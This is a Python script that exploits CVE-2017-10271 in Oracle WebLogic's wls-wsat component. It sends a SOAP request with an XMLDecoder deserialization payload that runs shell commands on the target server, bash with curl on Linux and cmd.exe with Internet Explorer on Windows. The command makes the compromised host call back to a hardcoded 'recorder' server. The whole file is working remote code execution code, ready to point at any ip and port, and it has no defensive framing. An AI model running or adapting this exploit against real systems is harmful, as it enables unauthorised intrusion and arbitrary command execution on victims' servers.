#coding=utf-8
import sys
import urllib2


def usage():
    print "CVE-2017-10271 Weblogic wls-wsat Exploit"
    print 'Usage: weblogic_10271.py ip port [linux|windows]'
    print 'Example: weblogic_10271.py 10.0.0.1 7001 linux'
    print 'Example: weblogic_10271.py 10.0.0.1 7001 windows'
    sys.exit()

    
if 3 != len(sys.argv[1:]):
    usage()

ip = sys.argv[1]
port = sys.argv[2]
version = sys.argv[3].lower() 

strIP = ip+":"+str(port)
recorder_url = 'http://192.168.0.1/record/record.asp?str=ip'+strIP    #recorder server url

url = "http://"+ip+":"+str(port)+"/wls-wsat/CoordinatorPortType"
headers={"User-Agent":"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0","Content-Type":"text/xml"} 

#如果是windows版的weblogic，则使用win_payload
strWCmd = '"C:\Program Files (x86)\Internet Explorer\iexplore.exe" ' + recorder_url
win_payload='<void index="0"><string>cmd.exe</string></void>\
             <void index="1"><string>/c</string></void>\
             <void index="2"><string>%s</string></void>' %strWCmd
            
#如果是linux版的weblogic，则使用lin_payload
strCmd = 'curl '+ recorder_url
lin_payload='<void index="0"><string>/bin/bash</string></void>\
             <void index="1"><string>-c</string></void>\
             <void index="2"><string>%s</string></void>' % strCmd

#拼接XML Payload
if version == "windows":
    xml_payload = win_payload
else:
    xml_payload = lin_payload
    
xml_request = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">\
<soapenv:Header>\
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">\
      <java version="1.8.0_131" class="java.beans.XMLDecoder">\
        <void class="java.lang.ProcessBuilder">\
          <array class="java.lang.String" length="3">\
            %s\
          </array>\
          <void method="start"/>\
        </void>\
      </java>\
    </work:WorkContext>\
  </soapenv:Header>\
  <soapenv:Body/>\
</soapenv:Envelope>' % xml_payload

request = urllib2.Request(url,headers=headers,data=xml_request)
try:
    response = urllib2.urlopen(request)
    print response.read()
except urllib2.URLError,e:  
    print e.read()  



